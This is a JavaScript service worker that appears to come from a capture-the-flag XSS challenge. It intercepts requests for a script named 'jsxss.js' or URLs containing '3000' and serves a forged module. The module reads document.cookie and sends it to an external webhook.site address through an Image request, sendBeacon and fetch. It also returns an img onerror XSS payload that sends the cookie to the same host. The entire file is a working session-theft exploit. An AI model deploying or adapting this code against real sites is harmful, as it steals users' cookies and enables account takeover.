self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
  const url = event.request.url;
  if (url.includes('jsxss.js') || url.includes('3000')) {
    const fakeModule = `
      export default function(input) {
        var cookie = encodeURIComponent(document.cookie || 'EMPTY_COOKIE');
        var target = 'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=' + cookie;
        
        // Multi-vector exfiltration
        try { new Image().src = target; } catch(e){}
        try { if (navigator.sendBeacon) navigator.sendBeacon(target); } catch(e){}
        try { fetch(target, { mode: 'no-cors', keepalive: true }); } catch(e){}

        return '<img src=x onerror="var c=encodeURIComponent(document.cookie);new Image().src=\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=\\'+c;if(navigator.sendBeacon)navigator.sendBeacon(\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?flag=\\'+c);">';
      }
    `;
    event.respondWith(
      new Response(fakeModule, {
        headers: { 
          'Content-Type': 'application/javascript',
          'Access-Control-Allow-Origin': '*'
        }
      })
    );
  }
});